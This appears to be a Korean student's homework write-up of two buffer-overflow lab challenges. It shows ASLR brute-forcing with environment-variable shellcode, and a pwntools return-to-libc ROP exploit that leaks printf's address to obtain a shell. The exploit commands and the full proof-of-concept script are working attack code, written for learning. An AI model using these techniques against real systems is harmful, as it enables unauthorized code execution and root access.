# hw9

## bof10

 현재 ASLR의 상태를 확인해본다.
 
 -> sysctl -a|grep -E"exec-|randomi"
 or cat /proc/sys/kernel/randomize_va_space
 
 ![](https://postfiles.pstatic.net/MjAxOTA3MTlfNTAg/MDAxNTYzNDcxOTc0MTQz.Pjh3q6oNi-f5usXOVJ3GPgwAFfFL0Ivg2cuAEvZK_MAg.LdbEClASQFmpJxviCu7UR7qAHY-3yYOigd8-XTOFqEsg.PNG.potenpanda/image.png?type=w773)
 
 2로되어있는것을 확인할 수 있으니 ASLR 우회를 해야한다.
 
 우선 bof10은 bof8처럼 NX bit는 걸려있지 않으므로 스택에 실행권한이 있다.
 따라서 쉘코드를 삽입해 익스플로잇 한다.
 
 마찬가지로 nop슬레이드를 타고 shellcode의 위치에 도달해야하는데, ASLR로인해 쉘코드의 주소값이 계속 바뀌므로
 brute force로 때려박아야한다.
 
    ```
    pwndbg> p/d 0xffffd5ec-0xffffd5d8
    $14 = 20
    ```
    

 
 while -> 버퍼까지의 길이 20 + 환경변수의 주소값
 
 SHELLCODE(뭔지모르겠음)
 
   ``` export SHELLCODE=`python -c "print '\x90'*10 +  '\xeb\x12\x31\xc9 ... '"````
    
 그리고 최종적으로 brute force를 위한 shell script를 작성한다. *(아무거나 막쳤음. do 다음에 ; 넣으면안됌)*
 
 
     `while : ; do  ./bof10 `python -c "print 'X'*20 + '\x45\x25\x95\xff'"` ; done`
     
 실행결과
 
 ![] (https://postfiles.pstatic.net/MjAxOTA3MTlfNTAg/MDAxNTYzNDc1MTgzMDk3.wWJmQoO8Oc2tIAa7i6_076TFjzz_7e7owfvwgV03xOwg.5YXd2tJVdPhz6YmjVVtCurfzSgMvQ5j9GbAzS7EX0d0g.PNG.potenpanda/image.png?type=w773)
 
 **오랜 세월이 지나고 root shell 탈취에 성공했다.**
 
 
## bof11
 
 bof11은 bof9와 마찬가지로 stack에 실행권한이 없지만, ASLR기법까지 적용되어 있다. 따라서 고정된 주소값을 통해 RTL을 하지 못하고
 상대적인 값을 구해야 하는게 차이점이다. 나머지는 동일.
 
 그렇다면 페이로드는 동일하게
 
     쓰레기값 + pop rdi; ret의 가젯 + /bin/sh + system -> 144byte 로 구성된다.
     
 여기서의 핵심은 파일을 실행할 시 유출되는 printf의 주소값들을 통해서 변하지 않는 고정적인 ***길이*** 를 구하는 것이다. 
 
 (libc 전체 덩어리의 함수 위치들은 고정적이라서 가능한 것 같다.)
 
 그렇다면 구해야할 것은 동일하다. gdb 안에서
 
 **system 주소값, /bin/sh, pop rdi ; ret 가젯을 구해서 각각에서 printf의 주소값을 빼주면 된다.**
 
 **system**
 
 ![](https://postfiles.pstatic.net/MjAxOTA3MTlfMTk2/MDAxNTYzNDc3MDE1ODc3.xMWu3iJXkfcuoFZeWEuEQ4SOGXhzGaEkAaIMKH3s54wg.WM-6RKKIPxpWRgI_Auz_s0gLjV9ih85wncUdUB5ecJUg.PNG.potenpanda/image.png?type=w773)
 
 system - printf를 한 결과 -66672
 
 **/bin/sh**
 
 ![](https://postfiles.pstatic.net/MjAxOTA3MTlfMjQ4/MDAxNTYzNDc3MTEzNTk0.Yz8wzg8cHsWoxSPqWepPr2plSxZNLPtlFJ2iBxQV-6Yg.TMq0oKxJn0K5ocZaK7UXBMmI9IFCc3E9JySlb9is9ikg.PNG.potenpanda/image.png?type=w773)
 
 /bin/sh - printf를 한 결과 1275223
 
 **pop rdi; ret**
 
 ![](https://postfiles.pstatic.net/MjAxOTA3MTlfMjky/MDAxNTYzNDc3MjgxODg0.2GIVHL5YTBnmskDGujU02j9lLy9-7hUhWPrp8nq4wwsg.wQnS-I5idCqrCEn8AtJSRQNmK4ShdLHrLT9z-KxYDhMg.PNG.potenpanda/image.png?type=w773)
 
 ![](https://postfiles.pstatic.net/MjAxOTA3MTlfMTk5/MDAxNTYzNDc3NDU3MTg5.7UU4WDs5Vn0dcb3VMf55gUps7JFOz5tdnNjYY25FuXIg.f-tk4lU1YmqudhHhZp4a16mNUtcdVHiiK4lsR5jZ-cwg.PNG.potenpanda/image.png?type=w773)
 
 오프셋을 구하고 libc의 주소에 더해준 뒤 printf의 주소를 뺀다 -> -214782
 
 
 이제 모두 구했다. 위에서 언급했던 페이로드를 적용시킨 **pwntool** 을 이용한 poc코드를 작성한다.
 
     ```
     from pwn import *

     p = process('./bof11')

     p.recvuntil('printf() address : ')
     printf_addr = p.recvuntil('\n')
     printf_addr = int(printf_addr, 16)
     
     sys_addr = printf_addr + (-66672)
     binsh = printf_addr + (1275223)
     poprdi = printf_addr + (-214782)
     distance_to_returnAddr = 24
     
     exploit = "A" * distance_to_returnAddr
     exploit += p64(poprdi)
     exploit += p64(binsh)
     exploit += p64(sys_addr)
     p.send(exploit)
     
     p.interactive()
     ```
 *code by 찬솔님*
 
 ![](https://postfiles.pstatic.net/MjAxOTA3MTlfMjU0/MDAxNTYzNDc3NzgxMTEz.3u-ZJMUThqzfn8p8SW9vMg0RUp0e-_0yR7fqOnE7sxog.ixAdB3zkZezT4koNE5XbubOwwWV_45oroSFQI9tC-9cg.PNG.potenpanda/image.png?type=w773)
 
 done.
 
 